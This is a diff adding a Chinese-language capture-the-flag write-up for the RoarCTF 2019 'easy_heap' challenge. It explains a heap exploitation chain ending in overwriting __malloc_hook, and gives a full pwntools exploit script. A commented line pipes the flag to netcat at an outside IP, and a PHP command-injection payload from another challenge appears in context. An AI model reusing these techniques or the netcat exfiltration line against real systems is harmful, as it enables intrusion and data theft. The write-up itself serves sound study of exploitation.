@@ -442,3 +442,151 @@ calc.php?%20num=ls;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).c
   create(0x68)
   r.interactive()
   ```
+
+
+
+
+
+* ### easy_heap
+
+  UAF
+
+  show被限制，需要使0x602090为0xdeadbeefdeadbeef
+
+  申请大量fastbin chunk然后free，scanf触发malloc_conslidate合并构造unsorted bin
+
+  ![2](D:\Ai\GitHub\images\roar\2.jpg)
+
+  ![1](D:\Ai\GitHub\images\roar\1.jpg)
+
+  开局username 和 password 构造house of spirit
+
+  利用666的calloc(0xa0)构造unlink，使666的ptr指向0x602080
+
+  ![4](D:\Ai\GitHub\images\roar\4.jpg)
+
+  然后free，下一次add申请到这里可以修改0x602090开show，泄露libc
+
+  ![5](D:\Ai\GitHub\images\roar\5.jpg)
+
+  show之后标准输出和标准错误关闭
+
+  拿回fastbin，fastbin attack打malloc_hook
+
+  ![3](D:\Ai\GitHub\images\roar\3.jpg)
+
+  
+
+  最后利用free触发异常，调用malloc_hook
+
+  没有标准输出，不能直接cat flag
+
+  ```python
+  from pwn import *
+  #r = remote('39.108.76.129',2333)
+  r = process('./roarctf_2019_easyheap')
+  elf = ELF('./roarctf_2019_easyheap')
+  libc =  ELF('./libc-2.23.so')
+  
+  def add(size,content):
+  	r.recvuntil('>>')
+  	r.sendline('1')
+  	r.recvuntil('size\n')
+  	r.sendline(str(size))
+  	r.recvuntil('content')
+  	r.send(content)
+  
+  def fuck_add(size,content):
+  	r.sendline('1')
+  	r.sendline(str(size))
+  	r.send(content)
+  
+  def free():
+  	r.recvuntil('>>')
+  	r.sendline('2')
+  
+  def fuck_free():
+  	r.sendline('2')
+  
+  def show():
+  	r.recvuntil('>>')
+  	r.sendline('3')
+  
+  def build_666(content):
+  	r.recvuntil('>>')
+  	r.sendline('666')
+  	r.recvuntil('?')
+  	r.sendline('1')
+  	r.send(content)
+  
+  def free_666():
+  	r.recvuntil('>>')
+  	r.sendline('666')
+  	r.recvuntil('?')
+  	r.sendline('2')
+  
+  r.recvuntil('username:')
+  r.send(p64(0)*3+p64(0x41))
+  r.recvuntil('info:')
+  r.send(p64(0)*3+p64(0x20e21))
+  
+  add(0x38,'fuck')
+  free()
+  add(0x48,'fuck')
+  free()
+  add(0x28,'fuck')
+  free()
+  add(0x18,'fuck')
+  free()
+  add(0x68,p64(0)*7+p64(0x21)+p64(0)*2+p64(0x20)+p64(0x101))
+  free()
+  
+  add(0x80,'fuck')
+  add(0x28,'fuck')
+  free()
+  
+  r.recvuntil('>>')
+  r.sendline('1'*0x400)
+  
+  
+  
+  payload = p64(0)*2+p64(0x602098-0x18)+p64(0x602098-0x10)
+  payload = payload.ljust(0x80,'\x00')
+  payload += p64(0x80)+p64(0x90)
+  
+  build_666(payload)
+  free()
+  free_666()
+  
+  add(0x38,p64(0)+p64(0x602080)+p64(0xdeadbeefdeadbeef))
+  r.interactive()
+  free()
+  
+  add(0x68,'a'*0x10)
+  show()
+  
+  r.recvuntil('a'*0x10)
+  leak = r.recvuntil('\n',drop=True)
+  libc_base = u64(leak.ljust(0x8,'\x00'))-0x3c4b78
+  malloc_hook = libc_base + libc.sym['__malloc_hook']
+  one = libc_base + 0xf02a4
+  log.success('libc_base:'+hex(libc_base))
+  log.success('malloc_hook:'+hex(malloc_hook))
+  log.success('one:'+hex(one))
+  
+  
+  fuck_free()
+  fuck_add(0x80,'fuck')
+  fuck_add(0x18,p64(0)+p64(0x71)+p64(malloc_hook-0x23))
+  fuck_add(0x68,'fuck')
+  fuck_add(0x68,'\x00'*0x13+p64(one))
+  fuck_free()
+  fuck_free()
+  
+  #r.sendline("cat flag | nc 39.108.76.129 2333")
+  #r.sendline("ls >&0")
+  
+  r.interactive()
+  ```
+
+  
